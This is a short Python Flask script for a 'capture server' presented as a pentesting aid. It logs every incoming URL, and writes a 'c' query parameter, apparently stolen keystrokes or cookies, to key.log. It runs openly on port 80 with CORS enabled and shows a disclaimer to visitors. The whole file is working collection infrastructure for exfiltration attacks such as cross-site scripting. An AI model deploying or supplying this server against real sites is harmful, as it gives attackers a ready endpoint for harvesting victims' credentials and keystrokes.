"""Run a server that takes all GET requests and dumps them."""

from flask import Flask, request, send_from_directory

from flask_cors import CORS
from w3lib.html import replace_entities

app = Flask(__name__)
CORS(app)


@app.route('/')
def route():
    """Get all GET and POST requests and dump them to logs."""
    # Print, log, and return.
    print(request.url)
    with open("cap.log", "a") as f:
        f.write(replace_entities(str(request.url)) + "\n")

    with open("key.log", "a") as f:
        if "c" in request.args:
            keys = replace_entities(request.args.get('c'))
            f.write(keys + '\n')

    return "WARNING: This site exists to demonstrate a 'capture server' for a penetration tester. Every GET request you send to it will be logged and recorded. Old logs will be deleted after some time, but information you send here is not safe. Use this site for educational purposes only! I am not responsible for any damages caused, as this site will be taken down as frequently as possible to reduce damages."


# @app.route('/<path:path>')
# def staticserve(path):
#     """Serve a file from your static directory."""
#     return app.send_static_file(path)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
